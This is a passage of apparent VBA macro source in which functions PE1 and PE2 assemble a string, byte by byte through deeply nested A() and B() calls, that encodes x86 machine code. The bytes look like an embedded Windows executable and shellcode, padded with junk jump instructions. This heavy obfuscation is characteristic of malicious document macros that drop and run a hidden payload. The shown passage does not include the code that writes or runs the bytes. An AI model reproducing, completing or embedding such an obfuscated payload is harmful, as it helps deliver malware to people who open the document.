    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "U"), 139), 236), 129)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 236), 228), 4), 200), 0), 184), 212), 2), 150), 0), "SV"), 163), 232), "~"), 141), 0), 163), 246), 11), "A"), 0), 163), "D@A"), 0), 163), 168), 24), "A"), 0), "3"), 219), 163), "H'A"), 0), "W"), 141), "E"), 12), "S"), 141), "M"), 8), "PQ"), 199)
    strPE = A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(strPE, 5), 240), 23), "AbD"), 210), "@"), 0), 136), 189), "@<A"), 0), 232), 214), "L"), 0), 0), "h"), 224), "_@"), 0), 232), 216), 164), 0), "@"), 131), 196), 4), "SS"), 23), 135), 26), "@zi"), 232), 252), ">"), 0), 0), 1), "U"), 12), 14)
    strPE = A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "E"), 8), "\"), 13), "L@"), 135), 0), "RP"), 141), "U2QR"), 189), "DJ"), 0), 30), 139), "U"), 244), 141), "E"), 252), 141), "M"), 251), "PQh"), 20), 210), 245), 0), "R"), 232), 222), "J}"), 0), 133), 192), 15), "7"), 154), "W"), 0), 0)
    strPE = B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(strPE, 139), 161), "h"), 139), "@"), 0), 15), 190), "E"), 254), 131), "/"), 196), 131), 248), "X"), 15), 135), "f"), 4), "U"), 0), 192), 201), 138), 136), "D"), 255), 251), 0), 6), "$"), 141), 152), 22), 203), 0), 196), "U"), 252), "g"), 255), 21), "l"), 193), "@"), 0), 131), 196), "J")
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(strPE, "~"), 195), 236), 16), 208), "@"), 0), 15), 173), "="), 4), "}"), 0), "h"), 248), 209), "@"), 0), 232), "m"), 237), 0), 0), 149), "r"), 4), 0), 138), 199), 5), 251), 2), "A"), 0), "j"), 0), 0), 0), 233), 31), 4), 0), 0), 137), 29), 20), 208), "@"), 0), 233)
    strPE = A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "\"), 4), 0), "qT"), 197), 252), "P"), 255), 21), "l"), 193), "@"), 0), 163), 24), 208), 31), 0), 233), 253), 28), 0), 0), 139), "M"), 252), "Q"), 255), 21), "l"), 193), "@"), 0), 205), "l"), 2), "A"), 0), 233), "."), 3), 0), 0), "9"), 29), "`"), 2), 141), 241)
    strPE = A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "~"), 13), "h"), 216), 187), "@"), 0), 232), 20), 157), 0), 0), 130), 196), 4), 199), "_`"), 191), "A"), 0), 255), 255), 255), 255), 233), 200), 3), 0), 0), 139), "U"), 252), 253), 255), 21), 136), 193), "@"), 0), "t"), 146), 11), "A"), 0), 233), 166), 3), 0), 0)
    strPE = A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 137), "q"), 28), 208), "@"), 0), 233), 169), 3), 0), 0), 139), 34), 252), "P"), 255), 6), 136), 193), "@"), 0), 163), 224), 23), "A"), 0), 233), "b"), 3), 0), 0), 226), 29), "$"), 208), "@"), 149), 233), 138), 3), 0), 0), "9"), 187), "`"), 2), "A"), 0), "t"), 13)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "h"), 186), 209), "@"), 0), 232), 178), 5), 0), 0), 131), 196), 4), 139), "M"), 211), "F"), 232), 134), "5"), 0), 172), 131), 196), 4), ";"), 195), 132), "q"), 199), 5), "`"), 2), "A"), 0), 1), 249), 0), 0), 233), "V"), 3), 0), 0), "9J 8A"), 0)
    strPE = A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 15), 132), "J"), 253), 0), 196), "P"), 152), 21), "p"), 193), "@"), 0), "9"), 29), "`"), 2), 194), 0), "."), 13), "h"), 140), 209), "@"), 0), 232), "k"), 225), 0), 248), 131), 196), 4), 139), 199), 252), "R"), 232), "?5"), 0), 0), 131), 196), 4), ";"), 134), "u"), 15)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 199), 5), "`yA"), 0), 2), 0), 0), 152), 233), 15), 153), 157), 0), "9"), 16), " 8A"), 0), 15), 132), "#"), 3), 17), 0), "P"), 186), 21), "z"), 193), 212), 0), 199), 5), "\"), 2), "A"), 0), 1), 0), 0), 0), 233), 237), 2), 0), 0), 139)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(strPE, "E"), 148), "Pc"), 21), "l"), 193), 225), 0), 163), "X"), 2), "A"), 0), 233), 214), 2), 0), 0), 139), 129), 252), "Q"), 255), 21), "l"), 193), "@5"), 163), "d"), 2), "A"), 163), 22), 5), 16), 208), "@,P"), 195), 0), 183), 27), 184), 2), 0), 0), 139)
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(strPE, "E"), 252), 186), 157), "8A"), 183), "+"), 208), 138), 8), 136), 12), 2), "@:"), 132), 253), 246), 233), 162), 2), 0), 0), 148), "U"), 252), 161), "L@A"), 0), "S:"), 156), 238), "@"), 0), 27), "h"), 144), 209), 231), 0), "P"), 232), 2), "F"), 253), "<")
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(strPE, 131), 196), 20), 163), "D"), 171), "A"), 0), 233), "{"), 135), "~"), 0), "}#"), 252), 139), 166), "t"), 193), "@g"), 197), "9"), 1), "~"), 17), "3"), 210), "j"), 221), 138), 23), "R"), 12), 214), 139), 192), 252), 131), 196), 15), 235), 18), 139), 13), "x"), 193), "@M")
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 132), 250), 138), 144), 179), 17), 149), 4), "B"), 131), 154), 27), 161), 195), "t"), 9), "G"), 18), "}"), 252), 235), 200), 192), 201), 255), "3"), 192), 242), 174), 247), 209), "IQ"), 232), "M"), 160), 129), 0), "M"), 0), 4), 0), 0), 225), 13), "hh"), 209), "@"), 0)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(strPE, 232), "Y"), 4), 0), 0), 131), 196), 4), 139), 196), 252), "("), 201), 255), 139), 250), "3"), 192), 242), 174), 247), 209), "I"), 141), 133), 244), "0"), 255), 255), "QR"), 132), 197), 201), 160), 0), "0S"), 141), 141), 244), 165), 255), 255), "h"), 16), 209), "@"), 0), "9")

    PE1 = strPE
End Function

Private Function PE2() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(strPE, "hv"), 137), 168), 3), 233), 142), "r"), 0), "|"), 139), "}"), 252), 150), 13), "t"), 193), "@"), 176), 131), "9"), 1), "~"), 17), "3"), 210), "j"), 157), 138), 23), "R"), 255), 214), 139), "}"), 252), 131), 196), 8), 235), 149), 139), 13), 147), 193), "C"), 0), "3"), 192), 138)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(strPE, 7), 139), 17), 138), 4), "B"), 131), 224), 8), ";"), 195), "t"), 6), "G"), 137), "}"), 252), 235), 200), 183), 201), "]3"), 192), 242), 174), 247), 209), "IQ"), 191), "`"), 160), 0), 0), "="), 0), 4), 0), 0), "v"), 13), 155), "4"), 209), "@"), 0), 232), 198), 3)
    strPE = B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 131), 196), 4), "~"), 240), 252), 131), 201), 255), 139), 250), "3R"), 242), 174), 247), 209), "I"), 141), 133), 167), 251), 139), 255), "QRa"), 232), "6"), 160), 0), "JS"), 141), 202), ")"), 251), 255), 255), "h"), 156), "Y@"), 0), "Qh"), 24), "k")
    strPE = A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "@"), 0), 139), 21), 4), 135), "A"), 0), 136), 156), 5), 244), "^"), 255), 255), 250), 28), "@i RP"), 232), 187), "D"), 0), 214), 131), 196), 24), 155), 4), 24), "A"), 0), 233), "4"), 1), 248), 0), 209), "M"), 229), "-=v"), 229), "A"), 0), 161)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "L@A"), 0), "Sh"), 156), 209), "@"), 0), 224), 24), 180), 232), 27), "D"), 222), 0), 139), "M"), 252), 139), "="), 140), 193), "@"), 0), "j"), 5), "h"), 16), 168), 4), 0), "Q"), 163), "H@A"), 0), 255), 215), 131), 196), 22), 133), 192), 25), "P"), 199)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 5), "|"), 2), "A"), 239), 1), 0), "D"), 0), "K"), 234), 0), 0), 0), 139), "U"), 190), "j"), 7), "h"), 8), 209), 24), 0), "R"), 255), 215), "T"), 196), 12), 23), 192), "<"), 15), 161), 5), 132), "*"), 163), ","), 1), 0), 0), 0), 233), 199), 0), 0), 0), 139)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "EZjCh"), 252), 208), "@"), 0), "P"), 255), 215), 131), 196), 12), 133), 192), "U"), 133), 175), 0), 146), 0), 13), 5), 128), 2), "A"), 136), "|"), 0), 0), "G"), 233), 160), 0), 137), 232), 199), 5), 136), 2), "A"), 0), 1), 0), 0), 0), 193), 145)
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 0), 0), "O"), 139), 154), 252), 199), 5), 136), 2), "AO"), 1), 0), 237), 0), "g"), 13), 232), 23), "A"), 0), 235), "|"), 25), "34j:R"), 2), 21), "3"), 193), "@"), 0), 131), 196), "X;"), 195), "t"), 18), 136), 212), "@"), 153), 255), 209), "l")
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 190), "@"), 0), 131), 196), 4), 163), 134), 2), "A"), 193), 139), "M"), 252), 186), "@"), 225), "A"), 0), "+"), 208), 138), 8), "S"), 220), 2), 157), ":"), 203), "K"), 243), 135), 5), 239), 2), 181), 0), 1), 10), 29), 0), 235), "7+EF"), 199), 5), 136), 245)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(strPE, "A"), 0), 1), 0), 0), "4"), 163), 168), 11), "A"), 177), "x{"), 139), "M"), 252), 217), "w"), 136), 2), "A"), 238), 202), "t"), 0), 0), 248), 13), 240), 23), "A"), 0), 235), 14), 139), "U"), 12), 139), 2), "P"), 232), 253), "-"), 196), 0), 131), 196), 4), 139), "E")
    strPE = A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(strPE, "0"), 250), "w"), 252), 141), "U"), 251), "QRw"), 20), 210), "@"), 0), "P"), 232), 153), "F"), 0), 0), 211), 192), 15), 18), 236), 251), 255), 255), 139), "E"), 244), "`M"), 8), 139), "5"), 128), 193), "@"), 0), "I9H"), 12), 190), "("), 133), "U"), 12), 139)
    strPE = A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 135), "!^"), 162), 0), 131), 193), 187), 139), 2), "P"), 162), 220), 208), 212), "E"), 246), 255), 214), 139), "U"), 12), 139), ">P"), 232), 168), 132), 0), 0), 139), "L"), 244), 231), "*"), 16), 139), "H/"), 139), "P"), 28), 139), 148), 138), "A"), 137), "H"), 12), 161)
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(strPE, 5), "sA"), 0), "RP"), 232), 201), "B"), 0), 0), "P"), 211), 246), "/"), 141), 0), 131), 196), 4), 133), 192), "to"), 15), "M"), 143), 161), 148), 192), "@"), 0), 25), 192), "R"), 139), 17), "R"), 190), 200), 208), "@"), 0), "P"), 255), 162), 139), "M"), 248), 139)
    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 147), "R"), 232), "[~"), 0), 0), 131), 196), 16), 161), 24), 208), "@"), 0), ";"), 195), "|"), 7), "= "), 227), 0), 0), "~/"), 197), "/"), 12), 139), 21), 200), 192), "@"), 0), 216), " N"), 0), 0), 131), 194), "z"), 139), 253), "Qh"), 160), 208), "@")
    strPE = B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(strPE, 0), "R"), 255), 214), 139), "E"), 12), 139), 8), "Q"), 232), "!-"), 0), 0), 161), 24), 208), "@"), 0), 131), 196), 20), 184), 13), 16), 26), "@"), 0), ";"), 193), "~+"), 139), "U"), 12), 139), 227), 200), "R@"), 0), 131), 193), "@"), 139), 2), "PhX")
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(strPE, 208), "@"), 196), "Q"), 255), 214), 139), "k"), 12), 139), 2), "P"), 232), 237), ","), 0), 0), 139), 13), 16), 208), "@"), 0), 131), 196), 16), 226), 29), 20), 208), "@"), 0), "t"), 161), 129), 249), 29), 0), 15), 0), "~6Tg"), 30), 239), "f"), 247), ":R")
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(strPE, 250), 2), "a"), 202), 193), 30), "!"), 3), 1), 131), 250), "X0"), 136), 20), "_@"), 0), "} "), 199), 5), 20), 208), "@"), 0), "d&"), 0), 0), 235), 20), 232), "7,"), 5), 0), "_"), 216), 144), 235), 8), 7), 182), 236), "DU"), 127), 142), 165)
    strPE = B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 252), 144), 235), 12), "bM"), 133), 134), 196), "z"), 5), 190), 161), "{"), 4), 162), 232), 215), 2), 0), 0), 144), 144), 235), 10), "x"), 31), 31), 8), "O2"), 4), "E"), 222), 149), 144), 235), 12), 2), 224), "Y:"), 25), 5), 150), "*Zn"), 216), "{")
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 235), 9), 136), 8), 8), 221), ">t"), 220), 236), 219), "`1"), 210), 235), 14), "W5Y"), 138), 7), 255), "q"), 171), "|"), 242), 150), 205), 218), 171), "d"), 139), "R0"), 235), 14), "#"), 204), 251), 222), "@"), 191), 193), 188), 152), 225), 18), 211), 5), 173)
    strPE = B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 139), "R"), 12), 144), 137), 229), 144), 235), 15), 226), "~"), 172), "`\"), 219), 201), "O"), 183), "^"), 180), 199), "r"), 195), 1), 139), "R"), 20), 139), "r("), 144), "1"), 255), 15), 183), "J&1"), 192), 235), 10), 244), 194), "5"), 127), "E="), 134), 226), "m")
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(strPE, 171), 172), 144), 235), 13), "<Y"), 5), 200), 17), "F"), 185), "|h6sfE<a"), 144), "|"), 13), 144), ", "), 235), 8), "o6F"), 205), "<"), 11), 233), 249), 193), 207), 13), 235), 8), "`z"), 246), 138), 145), 129), 23), "0"), 1)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 199), "Iu"), 189), 144), 235), 8), 251), 223), 228), 26), ">"), 142), 160), 31), "R"), 144), 235), 12), 34), 158), 154), "[ "), 254), 209), 22), 168), "<"), 20), 240), 139), "R"), 16), 144), 235), 15), 150), 243), 151), 164), 28), "b"), 232), 156), "$I"), 245), 146), "k")
